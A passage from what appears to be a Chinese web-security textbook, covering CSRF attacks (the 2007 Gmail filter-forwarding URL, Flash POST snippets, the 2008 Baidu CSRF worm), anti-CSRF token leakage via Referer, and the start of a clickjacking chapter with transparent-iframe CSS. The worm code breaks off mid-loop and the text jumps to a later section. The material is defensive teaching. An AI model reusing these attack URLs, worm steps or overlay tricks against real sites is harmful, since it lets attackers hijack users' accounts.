value="" />
攻击者甚至可以将这个页面隐藏在一个不可见的iframe窗口中，那么整个自动提交
表单的过程，对于用户来说也是不可见的。
在2007年的Gmail CSRF漏洞攻击过程中，安全研究者pdp展示了这一技巧。
首先，用户需要登录Gmail账户，以便让浏览器获得Gmail的临时Cookie。
用户登录Gmail
然后，攻击者诱使用户访问一个恶意页面。
攻击者诱使用户访问恶意页面
在这个恶意页面中，隐藏了一个iframe，iframe的地址指向pdp写的CSRF构造页
面。
http://www.gnucitizen.org/util/csrf?
_method=POST&_enctype=multipart/form-
data&_action
=https%3A//mail.google.com/mail/h/
ewt1jmuj4ddv/%3Fv
%3Dprf&cf2_emc=true&cf2_email=evil
PI:EMAIL&cf1_from&cf1_to&cf1_subj
&cf1_has&cf1_hasnot&cf1_attach=true&tfi&
s=z&irf=on&nvp_bu_cftb=Create%20Filter
这个链接的实际作用就是把参数生成一个POST的表单，并自动提交。
由于浏览器中已经存在Gmail的临时Cookie，所以用户在iframe中对Gmail发起的这
次请求会成功——邮箱的Filter中会新创建一条规则，将所有带附件的邮件都转发到攻
击者的邮箱中。
恶意站点通过CSRF在用户的Gmail中建立一条规则
Google在不久后即修补了这个漏洞。
4.2.4 Flash CSRF
Flash也有多种方式能够发起网络请求，包括POST。比如下面这段代码：
import flash.net.URLRequest;
import flash.system.Security;
var url = new URLRequest("http://target/page");
var param = new URLVariables();
param = "test=123";
url.method = "POST";
url.data = param;
sendToURL(url);
stop();
除了URLRequest外，在Flash中还可以使用getURL，loadVars等方式发起请求。比
如：
req = new LoadVars();
req.addRequestHeader("foo", "bar");
req.send("http://target/page?v1=123&v2=456",
"_blank", "GET");
在IE 6、IE 7中，Flash发送的网络请求均可以带上本地Cookie；但是从IE 8起，
Flash发起的网络请求已经不再发送本地Cookie了。
4.2.5 CSRF Worm
2008年9月，国内的安全组织80sec公布了一个百度的CSRF Worm。
漏洞出现在百度用户中心的发送短消息功能中：
http://msg.baidu.com/?
ct=22&cm=MailSend&tn=bmSubmit&sn=用户账户&co=
消息内容
只需要修改参数sn，即可对指定的用户发送短消息。而百度的另外一个接口则能查
询出某个用户的所有好友：
http://frd.baidu.com/?ct=28&un=用户账户
&cm=FriList&tn=bmABCFriList&callback=gotfriends
将两者结合起来，可以组成一个CSRF Worm——让一个百度用户查看恶意页面
后，将给他的所有好友发送一条短消息，然后这条短消息中又包含一张图片，其地址再
次指向CSRF页面，使得这些好友再次将消息发给他们的好友，这个Worm因此得以传
播。
Step 1：模拟服务器端取得request的参数。
var lsURL=window.location.href;
loU = lsURL.split("?");
if (loU.length>1)
{
var loallPm = loU[1].split("&");
……
定义蠕虫页面服务器地址，取得?和&符号后的字符串，从URL中提取感染蠕虫的用
户名和感染者的好友用户名。
Step 2：好友json数据的动态获取。
var gotfriends = function (x)
vilmsg]"
for(i=0;i
则“http://host/path/manage?user-name=abc&token=[random]”会作为HTTP请求的
Referer发送到evil.com的服务器上，从而导致Token泄露。
因此在使用Token时，应该尽量把Token放在表单中。把敏感操作由GET改为
POST，以form表单（或者AJAX）的形式提交，可以避免Token泄露。
此外，还有一些其他的途径可能导致Token泄露。比如XSS漏洞或者一些跨域漏
洞，都可能让攻击者窃取到Token的值。
CSRF的Token仅仅用于对抗CSRF攻击，当网站还同时存在XSS漏洞时，这个方案
就会变得无效，因为XSS可以模拟客户端浏览器执行任意操作。在XSS攻击下，攻击者
完全可以请求页面后，读出页面内容里的Token值，然后再构造出一个合法的请求。这
个过程可以称之为XSRF，和CSRF以示区分。
XSS带来的问题，应该使用XSS的防御方案予以解决，否则CSRF的Token防御就是
空中楼阁。安全防御的体系是相辅相成、缺一不可的。
4.4 小结
本章介绍了Web安全中的一个重要威胁：CSRF攻击。CSRF攻击也能够造成严重
的后果，不能忽略或轻视这种攻击方式。
CSRF攻击是攻击者利用用户的身份操作用户账户的一种攻击方式。设计CSRF的
防御方案必须先理解CSRF攻击的原理和本质。
根据“不可预测性原则”，我们通常使用AntiCSRF Token来防御CSRF攻击。在使用
Token时，要注意Token的保密性和随机性。
第5章 点击劫持（ClickJacking）
2008年，安全专家Robert Hansen与Jeremiah Grossman发现了一种被他们称
为“ClickJacking”（点击劫持）的攻击，这种攻击方式影响了几乎所有的桌面平台，包括
IE、Safari、Firefox、Opera以及Adobe Flash。两位发现者准备在当年的OWASP安全
大会上公布并进行演示，但包括Adobe在内的所有厂商，都要求在漏洞修补前不要公开
此问题。
5.1 什么是点击劫持
点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe，覆
盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点
击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页
面的一些功能性按钮上。
点击劫持原理示意图
看下面这个例子。
在http://www.a.com/test.html页面中插入了一个指向目标网站的iframe，出于演示
的目的，我们让这个iframe变成半透明：
CLICK JACK!!!
iframe {
width: 900px;
height: 250px;
/* Use absolute positioning to
line up update button with fake button */
position: absolute;
top: -195px;
left: -740px;
z-index: 2;
/* Hide from view */
-moz-opacity: 0.5;
opacity: 0.5;
filter: alpha(opacity=0.5);
}
button {
position: absolute;